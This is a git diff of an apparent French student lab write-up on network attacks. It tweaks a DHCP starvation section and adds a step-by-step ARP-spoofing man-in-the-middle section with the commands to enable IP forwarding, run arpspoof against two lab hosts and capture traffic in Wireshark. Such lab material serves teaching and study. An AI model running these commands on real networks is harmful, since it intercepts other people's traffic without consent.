@@ -66,7 +66,7 @@ L’attaquant inonde le serveur DHCP avec des messages DHCPREQUEST afin de rése
 ```
 ![Capture d’écran 2022-01-09 134631](https://user-images.githubusercontent.com/85891554/148682750-00da8427-69b5-4046-ade8-6229e73eaa12.png)
 
-Sur une autre machine, on va configurer le serveur DHCP
+Sur une autre machine, on a configurer le serveur DHCP
 _ configuration du dhcp _
 
 ![Capture d’écran 2022-01-09 135330](https://user-images.githubusercontent.com/85891554/148683028-cbb5c56d-1a0e-49c3-9c7d-2fda018eac72.png)
@@ -80,3 +80,35 @@ l'assignment des adresses ip
 ![Capture d’écran 2022-01-09 135433](https://user-images.githubusercontent.com/85891554/148683039-c7dfe30d-00f1-4ff3-ad4b-b6bf9d416c74.png)
 
 # Attaque “Man In The Middle” basée sur l'attaque “ARP spoofing”
+
+Pour réaliser cette attaque, nous avons besoin de trois nœuds connectés à un switch (cas réel ou sur 
+GNS3) ou à un point d'accès sans fil. Le nœud attaquant sera la machine sur laquelle est installé le 
+système d'exploitation « Kali Linux »
+
+> les tables arp apres l'attaque 
+## Etape 1 : activer le routage dans le nœud attaquant (Kali Linux)
+Tester si le routage est activé en utilisant la commande sysctl ou en cherchant la valeur de ip_forward
+dans /proc/sys/ipv4
+
+```cpp
+Root# sysctl net.ipv4.ip_forward
+net.ipv4.ip_forward = 0
+```
+Activer le routage :
+ ```cpp
+ root# sysctl -w net.ipv4.ip_forward=1
+ ```
+ ## Etape 2 : empoisonner les tables ARP des nœuds victimes
+ Lancer une communication entre les deux nœuds légtimes (exemple : ping) puis afficher le contenu de 
+leur table arp (arp -a). Exécuter, ensuite, l'attaque arpspoof.
+
+```cpp
+root#arpspoof -i eth0 -t 192.168.1.3 192.168.1.4
+root#arpspoof -i eth0 -t 192.168.1.4 192.168.1.3
+```
+on utilise Wireshark pour afficher le trafic capturé par l'attaquant
+```cpp
+root#wireshark
+```
+
+les tables arp apres l'attaque 
